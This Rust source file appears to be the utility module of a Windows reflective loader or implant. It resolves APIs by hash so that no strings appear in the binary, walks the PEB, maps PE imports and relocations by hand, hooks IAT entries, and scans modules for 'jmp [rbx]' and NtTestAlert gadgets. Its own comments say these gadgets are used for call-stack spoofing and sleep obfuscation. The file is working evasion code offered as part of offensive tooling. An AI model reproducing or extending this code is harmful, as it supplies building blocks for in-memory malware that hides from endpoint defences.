//! Core utility functions and macros for module resolution, memory operations,
//! PE image manipulation, and gadget scanning.
//!
//! All functions use DJB2 hashing (case-insensitive) for API and module name
//! resolution, avoiding plaintext strings in the binary. Memory helpers (`memzero`,
//! `memcopy`, `memcmp`, `memmem`) are `no_std`-compatible replacements for libc
//! equivalents. PE utilities handle import resolution, IAT hooking, and base
//! relocation fixups. Gadget scanners locate `jmp [rbx]` / `call [NtTestAlert]`
//! sequences in module `.text` sections for stack spoofing.

use {
    crate::{
        api::MemorySection,
        windows::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS, IMAGE_NT_SIGNATURE, *},
    },
    core::{ffi::c_void, ptr::null_mut},
};

/// Iterate over a doubly-linked `LIST_ENTRY` chain starting from `$head_list`.
///
/// Casts each node to `$type` and executes `$body` with `$current` bound to
/// the typed pointer. Stops when the traversal wraps back to the head.
#[macro_export]
macro_rules! range_head_list {
    ($head_list:expr, $type:ty, |$current:ident| $body:block) => {
        {
            let head_ptr = $head_list as *const LIST_ENTRY;
            let mut $current = (*head_ptr).Flink as $type;

            while $current as *const _ != head_ptr as *const _ {
                $body
                $current = (*$current).InLoadOrderLinks.Flink as $type;
            }
        }
    };
}

/// Compute the DJB2 hash of a string literal at compile time.
///
/// Wraps [`djb2_hash`] for use in `const` contexts (e.g., module/export name hashing).
#[macro_export]
macro_rules! hash_str {
    ($s:expr) => {
        $crate::util::djb2_hash($s)
    };
}

/// Resolve a Windows API function pointer by DJB2 hash from a loaded module.
///
/// Returns a `*const unsafe extern "system" fn()` suitable for `transmute` to the
/// concrete function type.
#[macro_export]
macro_rules! resolve_api {
    ($module:expr, $name:ident) => {
        $crate::util::api::<unsafe extern "system" fn()>(
            $module,
            $crate::hash_str!(stringify!($name)) as usize,
        ) as *const unsafe extern "system" fn()
    };
}

/// Internal helper macro for batch API resolution (unused in current code).
#[allow(unused_macros)]
#[macro_export]
macro_rules! _api {
    ($api:expr, $module:ident) => {{
        let base_addr = $api.$module.handle;
        if base_addr != 0 {
            $(
                $api.$module.$api = transmute(get_export_by_hash(base_addr, $api.$module.$api as usize));
            )*
        }
    }};
}

/// Check whether an `NTSTATUS` value indicates success (`>= 0`).
#[macro_export]
macro_rules! NT_SUCCESS {
    ($status:expr) => {
        $status >= 0
    };
}

/// Print a formatted debug string via `DbgPrint` (kernel debugger output).
///
/// Feature-gated behind `debug-dbgprint`. When disabled, compiles to nothing.
#[cfg(feature = "debug-dbgprint")]
#[macro_export]
macro_rules! dbg_print {
    ($api:expr, $fmt:expr) => {{
        unsafe {
            if !$api.ntdll.DbgPrint_ptr.is_null() {
                let dbg_print: $crate::windows::FnDbgPrint =
                    core::mem::transmute($api.ntdll.DbgPrint_ptr);
                dbg_print($fmt.as_ptr());
            }
        }
    }};
    ($api:expr, $fmt:expr, $($arg:expr),*) => {{
        unsafe {
            if !$api.ntdll.DbgPrint_ptr.is_null() {
                let dbg_print: $crate::windows::FnDbgPrint =
                    core::mem::transmute($api.ntdll.DbgPrint_ptr);
                dbg_print($fmt.as_ptr(), $($arg),*);
            }
        }
    }};
}

/// No-op stub when `debug-dbgprint` is disabled.
#[cfg(not(feature = "debug-dbgprint"))]
#[macro_export]
macro_rules! dbg_print {
    ($api:expr, $fmt:expr) => {{}};
    ($api:expr, $fmt:expr, $($arg:expr),*) => {{}};
}

/// DJB2 seed value.
const DJB2_INIT: u32 = 5381;

/// Compute the case-insensitive DJB2 hash of a null-terminated ASCII string at runtime.
///
/// # Arguments
///
/// * `string` - Pointer to a null-terminated byte string.
///
/// # Returns
///
/// The 32-bit DJB2 hash with all characters uppercased before hashing.
///
/// # Safety
///
/// `string` must point to a valid null-terminated byte sequence.
#[link_section = ".text$E"]
pub unsafe fn hash_string(string: *const u8) -> u32 {
    let mut hash = DJB2_INIT;
    let mut ptr = string;

    while *ptr != 0 {
        let mut byte = *ptr;

        if byte >= b'a' {
            byte -= 0x20;
        }

        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(byte as u32);

        ptr = ptr.add(1);
    }

    hash
}

/// Compute the case-insensitive DJB2 hash of a null-terminated wide (UTF-16) string.
///
/// Only the low byte of each `u16` character is hashed (sufficient for ASCII module
/// and export names used in Windows).
///
/// # Arguments
///
/// * `string` - Pointer to a null-terminated wide string.
///
/// # Returns
///
/// The 32-bit DJB2 hash.
///
/// # Safety
///
/// `string` must point to a valid null-terminated `u16` sequence.
#[link_section = ".text$E"]
pub unsafe fn hash_string_wide(string: *const u16) -> u32 {
    let mut hash = DJB2_INIT;
    let mut ptr = string;

    while *ptr != 0 {
        let mut byte = (*ptr & 0xFF) as u8;

        if byte >= b'a' {
            byte -= 0x20;
        }

        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(byte as u32);

        ptr = ptr.add(1);
    }

    hash
}

/// Compute the case-insensitive DJB2 hash of a `&str` at compile time.
///
/// # Arguments
///
/// * `s` - The string slice to hash.
///
/// # Returns
///
/// The 32-bit DJB2 hash with all characters uppercased.
#[link_section = ".text$E"]
pub const fn djb2_hash(s: &str) -> u32 {
    let bytes = s.as_bytes();
    let mut hash = DJB2_INIT;
    let mut i = 0;

    while i < bytes.len() {
        let mut byte = bytes[i];

        if byte >= b'a' {
            byte -= 0x20;
        }

        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(byte as u32);

        i += 1;
    }

    hash
}

/// Zero `length` bytes starting at `memory`.
///
/// # Arguments
///
/// * `memory` - Start address to zero.
/// * `length` - Number of bytes to clear.
///
/// # Safety
///
/// The caller must ensure `memory` is valid for `length` bytes.
#[link_section = ".text$E"]
pub unsafe fn memzero(memory: *mut u8, length: u32) {
    for i in 0..length {
        *memory.offset(i as isize) = 0;
    }
}

/// Copy `length` bytes from `source` to `destination`.
///
/// # Arguments
///
/// * `destination` - Target buffer.
/// * `source` - Source buffer.
/// * `length` - Number of bytes to copy.
///
/// # Returns
///
/// The `destination` pointer.
///
/// # Safety
///
/// Both buffers must be valid for `length` bytes. Regions may overlap (forward copy).
#[link_section = ".text$E"]
pub unsafe fn memcopy(destination: *mut u8, source: *const u8, length: u32) -> *mut u8 {
    for i in 0..length {
        *destination.offset(i as isize) = *source.offset(i as isize);
    }
    destination
}

/// Compare `length` bytes between two memory regions.
///
/// # Arguments
///
/// * `memory1` - First buffer.
/// * `memory2` - Second buffer.
/// * `length` - Number of bytes to compare.
///
/// # Returns
///
/// `0` if equal, otherwise the difference of the first mismatched byte pair
/// (cast to `u32`).
///
/// # Safety
///
/// Both pointers must be valid for `length` bytes.
#[link_section = ".text$E"]
pub unsafe fn memcmp(memory1: *const u8, memory2: *const u8, length: usize) -> u32 {
    let mut a = memory1;
    let mut b = memory2;
    let mut len = length;

    while len > 0 {
        let val1 = *a;
        let val2 = *b;

        if val1 != val2 {
            return (val1 as i32 - val2 as i32) as u32;
        }

        a = a.offset(1);
        b = b.offset(1);
        len -= 1;
    }

    0
}

/// Find the first occurrence of `needle` in `haystack` (byte-level substring search).
///
/// # Arguments
///
/// * `haystack` - The buffer to search in.
/// * `needle` - The pattern to find.
///
/// # Returns
///
/// `Some(offset)` of the first match, or `None` if not found or `needle` is empty.
#[link_section = ".text$E"]
pub fn memmem(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    let h_len = haystack.len();
    let n_len = needle.len();
    if n_len == 0 || n_len > h_len {
        return None;
    }

    let h_ptr = haystack.as_ptr();
    let n_ptr = needle.as_ptr();

    let mut i = 0usize;
    while i <= h_len - n_len {
        let mut j = 0usize;
        while j < n_len {
            if unsafe { *h_ptr.add(i + j) != *n_ptr.add(j) } {
                break;
            }
            j += 1;
        }
        if j == n_len {
            return Some(i);
        }
        i += 1;
    }

    None
}

/// Resolve a loaded DLL's base address by DJB2 hash of its name.
///
/// Walks the PEB `InLoadOrderModuleList` and compares each entry's `BaseDllName`
/// against `library_hash`. If `library_hash` is 0, returns the first module
/// (the executable itself via `OriginalBase`).
///
/// # Arguments
///
/// * `library_hash` - DJB2 hash of the DLL name (e.g., `hash_str!("ntdll.dll")`),
///   or 0 to get the first loaded module.
///
/// # Returns
///
/// The module base address, or 0 if not found.
///
/// # Safety
///
/// Requires a valid PEB. Must be called from user mode with the loader lock not held
/// in a way that would deadlock.
#[link_section = ".text$E"]
pub unsafe fn get_loaded_module_by_hash(library_hash: u32) -> usize {
    let peb = NtCurrentPeb();
    let ldr = (*peb).Ldr;
    let module_list = &(*ldr).InLoadOrderModuleList;

    let mut result = 0;

    range_head_list!(module_list, PLDR_DATA_TABLE_ENTRY, |current| {
        if library_hash == 0 {
            result = (*current).OriginalBase as usize;
            break;
        }

        if hash_string_wide((*current).BaseDllName.Buffer) == library_hash {
            result = (*current).OriginalBase as usize;
            break;
        }
    });

    result
}

/// Resolve an exported function address by DJB2 hash from a PE module.
///
/// Parses the PE export directory, hashes each exported name, and returns the
/// address of the matching function.
///
/// # Arguments
///
/// * `module_base` - Base address of the loaded PE module.
/// * `symbol_hash` - DJB2 hash of the export name to find.
///
/// # Returns
///
/// The resolved function address, or 0 if `module_base`/`symbol_hash` is 0,
/// the PE headers are invalid, or no matching export is found.
///
/// # Safety
///
/// `module_base` must point to a valid loaded PE image.
#[link_section = ".text$E"]
pub unsafe fn get_export_by_hash(module_base: usize, symbol_hash: usize) -> usize {
    if module_base == 0 || symbol_hash == 0 {
        return 0;
    }

    let mut address = 0;

    let dos_header = module_base as *mut IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return 0;
    }

    let nt_headers = (module_base + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS;
    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return 0;
    }

    let export_dir_rva =
        (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    let export_dir = (module_base + export_dir_rva as usize) as *mut IMAGE_EXPORT_DIRECTORY;

    let names = (module_base + (*export_dir).AddressOfNames as usize) as *mut u32;
    let functions = (module_base + (*export_dir).AddressOfFunctions as usize) as *mut u32;
    let ordinals = (module_base + (*export_dir).AddressOfNameOrdinals as usize) as *mut u16;

    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.offset(i as isize);
        let name = (module_base + name_rva as usize) as *const u8;

        if hash_string(name) == symbol_hash as u32 {
            let ordinal = *ordinals.offset(i as isize) as isize;
            let function_rva = *functions.offset(ordinal);
            address = module_base + function_rva as usize;
            break;
        }
    }

    address
}

/// Generic typed wrapper around [`get_export_by_hash`].
///
/// # Arguments
///
/// * `module_base` - Base address of the loaded PE module.
/// * `symbol_hash` - DJB2 hash of the export name.
///
/// # Returns
///
/// A typed pointer to the resolved export, or null if not found.
///
/// # Safety
///
/// Same requirements as [`get_export_by_hash`]. The caller must ensure `T` matches
/// the actual export's signature.
#[link_section = ".text$E"]
pub unsafe fn api<T>(module_base: usize, symbol_hash: usize) -> *mut T {
    get_export_by_hash(module_base, symbol_hash) as *mut T
}

/// Get the `SizeOfImage` from a PE module's NT optional header.
///
/// # Arguments
///
/// * `base` - Base address of the loaded PE module.
///
/// # Returns
///
/// `SizeOfImage` in bytes, or 0 if `base` is 0 or the PE headers are invalid.
///
/// # Safety
///
/// `base` must point to a valid loaded PE image (or be 0).
#[inline(always)]
#[link_section = ".text$E"]
pub unsafe fn module_size(base: usize) -> ULONG {
    if base == 0 {
        return 0;
    }

    let dos = base as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return 0;
    }

    let nt = (base + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return 0;
    }

    (*nt).OptionalHeader.SizeOfImage
}

/// Resolve all imports in a PE image's import directory.
///
/// Walks the `IMAGE_IMPORT_DESCRIPTOR` array, loads each referenced DLL via
/// `LdrLoadDll`, and patches the IAT (`FirstThunk`) entries with resolved
/// addresses from `LdrGetProcedureAddress`. Supports both ordinal and name imports.
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (needs ntdll string/loader functions).
/// * `image` - Base address of the PE image in memory.
/// * `directory` - Pointer to the start of the import directory
///   (`IMAGE_DIRECTORY_ENTRY_IMPORT` RVA resolved to VA).
///
/// # Returns
///
/// `Some(true)` on success. Does not currently return `None` on individual
/// import failures - partially resolved images are possible.
///
/// # Safety
///
/// `image` and `directory` must point to a valid mapped PE. The `api` ntdll
/// function pointers for string and loader operations must be resolved.
#[link_section = ".text$E"]
pub unsafe fn resolve_imports(
    api: &mut crate::api::Api,
    image: *mut u8,
    directory: *mut u8,
) -> Option<bool> {
    let mut imp = directory as *mut IMAGE_IMPORT_DESCRIPTOR;

    while (*imp).Name != 0 {
        let mut ansi_string: STRING = core::mem::zeroed();
        let mut unicode_string: UNICODE_STRING = core::mem::zeroed();
        let mut module_handle: HANDLE = null_mut();

        let dll_name = (image as usize + (*imp).Name as usize) as *const i8;
        api.ntdll.RtlInitAnsiString(&mut ansi_string, dll_name);

        if NT_SUCCESS!(api.ntdll.RtlAnsiStringToUnicodeString(
            &mut unicode_string,
            &mut ansi_string,
            1 as BOOLEAN
        )) {
            if NT_SUCCESS!(api.ntdll.LdrLoadDll(
                null_mut(),
                null_mut(),
                &mut unicode_string,
                &mut module_handle as *mut HANDLE as *mut PVOID
            )) {
                let mut otd = (image as usize + (*imp).u.OriginalFirstThunk as usize)
                    as *mut IMAGE_THUNK_DATA;
                let mut ntd =
                    (image as usize + (*imp).FirstThunk as usize) as *mut IMAGE_THUNK_DATA;

                while (*otd).u1.AddressOfData != 0 {
                    let mut function: PVOID = null_mut();

                    if IMAGE_SNAP_BY_ORDINAL((*otd).u1.Ordinal) {
                        let ordinal = IMAGE_ORDINAL((*otd).u1.Ordinal) as u32;
                        if NT_SUCCESS!(api.ntdll.LdrGetProcedureAddress(
                            module_handle,
                            null_mut(),
                            ordinal,
                            &mut function
                        )) {
                            (*ntd).u1.Function = function as u64;
                        }
                    } else {
                        let ibn = (image as usize + (*otd).u1.AddressOfData as usize)
                            as *mut IMAGE_IMPORT_BY_NAME;
                        api.ntdll
                            .RtlInitAnsiString(&mut ansi_string, (*ibn).Name.as_ptr() as *const i8);

                        if NT_SUCCESS!(api.ntdll.LdrGetProcedureAddress(
                            module_handle,
                            &mut ansi_string,
                            0,
                            &mut function
                        )) {
                            (*ntd).u1.Function = function as u64;
                        }
                    }

                    otd = otd.add(1);
                    ntd = ntd.add(1);
                }
            }

            api.ntdll.RtlFreeUnicodeString(&mut unicode_string);
        }

        imp = imp.add(1);
    }

    return Some(true);
}

/// Replace an IAT entry with a hook function by matching the import's DJB2 hash.
///
/// Walks the import directory and patches the `FirstThunk` entry whose
/// `IMAGE_IMPORT_BY_NAME` name matches `function_hash`.
///
/// # Arguments
///
/// * `image` - Base address of the PE image.
/// * `directory` - Pointer to the import directory.
/// * `function_hash` - DJB2 hash of the target import name to hook.
/// * `hook_function` - Replacement function pointer to write into the IAT.
///
/// # Safety
///
/// `image` and `directory` must point to a valid mapped PE. The IAT page must
/// be writable (or made writable beforehand).
#[link_section = ".text$E"]
pub unsafe fn hook_iat(
    image: *mut u8,
    directory: *mut u8,
    function_hash: u32,
    hook_function: *mut u8,
) {
    let mut imp = directory as *mut IMAGE_IMPORT_DESCRIPTOR;

    while (*imp).Name != 0 {
        let mut otd =
            (image as usize + (*imp).u.OriginalFirstThunk as usize) as *mut IMAGE_THUNK_DATA;
        let mut ntd = (image as usize + (*imp).FirstThunk as usize) as *mut IMAGE_THUNK_DATA;

        while (*otd).u1.AddressOfData != 0 {
            if !IMAGE_SNAP_BY_ORDINAL((*otd).u1.Ordinal) {
                let ibn = (image as usize + (*otd).u1.AddressOfData as usize)
                    as *mut IMAGE_IMPORT_BY_NAME;
                let name_addr = (*ibn).Name.as_ptr() as *const u8;

                if function_hash == hash_string(name_addr) {
                    (*ntd).u1.Function = hook_function as u64;
                }
            }

            otd = otd.add(1);
            ntd = ntd.add(1);
        }

        imp = imp.add(1);
    }
}

/// Apply base relocations to a PE image loaded at a non-preferred address.
///
/// Processes `IMAGE_BASE_RELOCATION` blocks and adjusts `DIR64` (8-byte) and
/// `HIGHLOW` (4-byte) fixups by the delta between the actual and preferred base.
///
/// # Arguments
///
/// * `image` - Actual base address of the loaded PE image.
/// * `directory` - Pointer to the relocation directory
///   (`IMAGE_DIRECTORY_ENTRY_BASERELOC` RVA resolved to VA).
/// * `image_base` - Preferred base address from the PE optional header.
///
/// # Returns
///
/// The number of relocations applied.
///
/// # Safety
///
/// `image` and `directory` must point to a valid mapped PE with writable relocation
/// target pages.
#[link_section = ".text$E"]
pub unsafe fn rebase_image(image: *mut u8, directory: *mut u8, image_base: *mut u8) -> u32 {
    let offset = image as isize - image_base as isize;

    let mut ibr = directory as *mut IMAGE_BASE_RELOCATION;

    let mut reloc_count = 0u32;

    while (*ibr).VirtualAddress != 0 {
        let mut rel =
            (ibr as usize + core::mem::size_of::<IMAGE_BASE_RELOCATION>()) as *mut IMAGE_RELOC;
        let block_end = (ibr as usize + (*ibr).SizeOfBlock as usize) as *mut IMAGE_RELOC;

        while rel < block_end {
            match (*rel).reloc_type() as u32 {
                IMAGE_REL_BASED_DIR64 => {
                    let target = (image as usize
                        + (*ibr).VirtualAddress as usize
                        + (*rel).offset() as usize) as *mut u64;
                    *target = ((*target as isize) + offset) as u64;
                    reloc_count += 1;
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    let target = (image as usize
                        + (*ibr).VirtualAddress as usize
                        + (*rel).offset() as usize) as *mut u32;
                    *target = ((*target as isize) + offset) as u32;
                    reloc_count += 1;
                }
                _ => {}
            }

            rel = rel.add(1);
        }

        ibr = rel as *mut IMAGE_BASE_RELOCATION;
    }

    reloc_count
}

/// Scan a module's memory for a `jmp [rbx]` gadget (`0xFF 0x23`).
///
/// Used by sleep obfuscation to find an indirect jump gadget for call-stack spoofing.
///
/// # Arguments
///
/// * `module` - Base address of the module to scan.
/// * `size` - Size of the module in bytes.
///
/// # Returns
///
/// Pointer to the gadget, or null if not found.
///
/// # Safety
///
/// `module` must point to a readable memory region of at least `size` bytes.
#[link_section = ".text$E"]
pub unsafe fn find_gadget(module: *mut u8, size: ULONG) -> *mut c_void {
    if module.is_null() || size == 0 {
        return core::ptr::null_mut();
    }

    for x in 0..size {
        let byte1 = *module.add(x as usize);
        let byte2 = *module.add(x as usize + 1);

        // 0xFF 0x23 = jmp [rbx]
        if byte1 == 0xFF && byte2 == 0x23 {
            let gadget = module.add(x as usize) as *mut c_void;
            if !gadget.is_null() && (gadget as usize) >= 0x10000 {
                return gadget;
            }
        }
    }

    core::ptr::null_mut()
}

/// Scan a module for the `call [NtTestAlert]` gadget pattern used in APC call-stack
/// spoofing (Foliage).
///
/// Searches for a 13-byte pattern:
/// ```text
/// 48 83 EC 28    sub rsp, 0x28
/// F7 41 04       test dword ptr [rcx+4], ...
/// 66 00 00 00    (imm16 operand)
/// 74 05          jz +5
/// ```
/// The gadget address is the instruction at offset `0xD` after the pattern match.
///
/// # Arguments
///
/// * `module` - Base address of the module to scan.
/// * `size` - Size of the module in bytes.
///
/// # Returns
///
/// Pointer to the gadget (at pattern + 0xD), or null if not found.
///
/// # Safety
///
/// `module` must point to a readable memory region of at least `size` bytes.
#[link_section = ".text$E"]
pub unsafe fn find_call_nttestalert_gadget(module: *mut u8, size: ULONG) -> *mut c_void {
    if module.is_null() || size < 13 {
        return core::ptr::null_mut();
    }

    let pattern: [u8; 13] = [
        0x48, 0x83, 0xEC, 0x28, 0xF7, 0x41, 0x04, 0x66, 0x00, 0x00, 0x00, 0x74, 0x05,
    ];

    for x in 0..(size - 13) {
        let mut found = true;
        for i in 0..13 {
            if *module.add(x as usize + i) != pattern[i] {
                found = false;
                break;
            }
        }

        if found {
            let gadget = module.add(x as usize + 0xd) as *mut c_void;
            if !gadget.is_null() && (gadget as usize) >= 0x10000 {
                return gadget;
            }
        }
    }

    core::ptr::null_mut()
}

/// Convert PE section characteristics flags to a Windows page protection constant.
///
/// # Arguments
///
/// * `characteristics` - Combination of `IMAGE_SCN_MEM_EXECUTE`, `IMAGE_SCN_MEM_READ`,
///   and `IMAGE_SCN_MEM_WRITE` flags from a PE section header.
///
/// # Returns
///
/// The corresponding `PAGE_*` protection constant (e.g., `PAGE_EXECUTE_READ`).
/// Falls back to `PAGE_NOACCESS` for unrecognized combinations.
#[link_section = ".text$E"]
pub fn section_characteristics_to_protect(characteristics: DWORD) -> DWORD {
    let executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    let readable = (characteristics & IMAGE_SCN_MEM_READ) != 0;
    let writable = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

    match (executable, readable, writable) {
        (true, true, true) => PAGE_EXECUTE_READWRITE,
        (true, true, false) => PAGE_EXECUTE_READ,
        (true, false, false) => PAGE_EXECUTE,
        (false, true, true) => PAGE_READWRITE,
        (false, true, false) => PAGE_READONLY,
        _ => PAGE_NOACCESS,
    }
}

/// Check whether a page protection value includes write access.
///
/// # Arguments
///
/// * `protection` - A `PAGE_*` constant.
///
/// # Returns
///
/// `true` if the protection allows writing (`PAGE_READWRITE`, `PAGE_WRITECOPY`,
/// `PAGE_EXECUTE_READWRITE`, or `PAGE_EXECUTE_WRITECOPY`).
#[link_section = ".text$E"]
pub fn is_writable(protection: u32) -> bool {
    protection == PAGE_EXECUTE_READWRITE
        || protection == PAGE_EXECUTE_WRITECOPY
        || protection == PAGE_READWRITE
        || protection == PAGE_WRITECOPY
}

/// Change a memory section's protection to `PAGE_READWRITE` if not already writable.
///
/// Saves the previous protection in `section.previous_protect` for later restoration
/// via [`restore_section_protection`].
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (needs `kernel32.VirtualProtect`).
/// * `section` - The memory section to make writable.
///
/// # Safety
///
/// `section` must describe a valid mapped memory region.
#[link_section = ".text$E"]
pub unsafe fn make_section_writable(api: &mut crate::api::Api, section: &mut MemorySection) {
    if !is_writable(section.current_protect) {
        let mut old_protect = 0u32;
        let result = api.kernel32.VirtualProtect(
            section.base_address,
            section.size,
            PAGE_READWRITE,
            &mut old_protect,
        );
        if result != 0 {
            section.previous_protect = old_protect;
            section.current_protect = PAGE_READWRITE;
        }
    }
}

/// Restore a memory section's protection to its `previous_protect` value.
///
/// Counterpart to [`make_section_writable`].
///
/// # Arguments
///
/// * `api` - Resolved API function pointers (needs `kernel32.VirtualProtect`).
/// * `section` - The memory section whose protection to restore.
///
/// # Safety
///
/// `section` must describe a valid mapped memory region and `previous_protect`
/// must have been set by a prior call to [`make_section_writable`].
#[link_section = ".text$E"]
pub unsafe fn restore_section_protection(api: &mut crate::api::Api, section: &mut MemorySection) {
    if section.current_protect != section.previous_protect {
        let mut old_protect = 0u32;
        let result = api.kernel32.VirtualProtect(
            section.base_address,
            section.size,
            section.previous_protect,
            &mut old_protect,
        );
        if result != 0 {
            section.current_protect = section.previous_protect;
        }
    }
}

/// Make all tracked memory sections writable (batch version of [`make_section_writable`]).
///
/// Iterates `api.sleep.sections[0..num_sections]` (capped at 20).
///
/// # Arguments
///
/// * `api` - Resolved API function pointers and sleep context with section list.
///
/// # Safety
///
/// All section entries must describe valid mapped memory regions.
#[link_section = ".text$E"]
pub unsafe fn make_sections_writable(api: &mut crate::api::Api) {
    for i in 0..api.sleep.num_sections.min(20) {
        let section_ptr = &mut api.sleep.sections[i] as *mut MemorySection;
        make_section_writable(api, &mut *section_ptr);
    }
}

/// Restore all tracked memory sections to their original protections (batch version
/// of [`restore_section_protection`]).
///
/// Iterates `api.sleep.sections[0..num_sections]` (capped at 20).
///
/// # Arguments
///
/// * `api` - Resolved API function pointers and sleep context with section list.
///
/// # Safety
///
/// All section entries must describe valid mapped memory regions with valid
/// `previous_protect` values.
#[link_section = ".text$E"]
pub unsafe fn restore_section_protections(api: &mut crate::api::Api) {
    for i in 0..api.sleep.num_sections.min(20) {
        let section_ptr = &mut api.sleep.sections[i] as *mut MemorySection;
        restore_section_protection(api, &mut *section_ptr);
    }
}

/// Mark all tracked sections as having a specific protection in the tracking fields.
///
/// This does **not** call `VirtualProtect` - it only updates `current_protect` so
/// that a subsequent [`restore_section_protections`] call sees the correct mismatch
/// and issues the real `VirtualProtect` calls.
///
/// Typical use: after an NtContinue chain flips the entire buffer to
/// `PAGE_EXECUTE_READ`, call this with `protect = PAGE_EXECUTE_READ` to sync
/// tracking before restoring per-section permissions.
#[link_section = ".text$E"]
pub unsafe fn mark_sections_protect(api: &mut crate::api::Api, protect: u32) {
    for i in 0..api.sleep.num_sections.min(20) {
        api.sleep.sections[i].current_protect = protect;
    }
}
